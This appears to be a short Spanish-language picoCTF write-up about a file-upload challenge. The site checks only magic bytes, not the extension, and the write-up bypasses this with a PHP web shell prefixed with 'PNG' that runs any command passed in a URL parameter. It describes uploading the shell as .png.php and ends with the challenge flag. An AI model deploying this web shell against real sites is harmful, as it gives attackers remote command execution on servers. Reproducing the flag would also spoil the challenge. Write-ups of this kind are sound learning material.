
SOLUCION:
Consiste en meter codigo malicioso a un sitio, para obtener una shell y poder sacar la bandera

en este caso el sitio solo comprueba unos "bytes" magicos, pero en realidad no checa la extension del archivo, asi que hay tenemos una vulnerabilidad...

Lo que hacemos es meter un codigo de php para obtener una shell y poder navegar entre los archivos

PNG
<?php
if(isset($_GET['cmd'])){
        echo "<pre>";
        system($_GET['cmd']);
        echo "</pre>";
}
?>
este codigo solo lo guardamos con .png.php y lo subimos al sitio, una ves subido podemos ir a la carpeta uploads y abrir el archivo

picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_3f706222}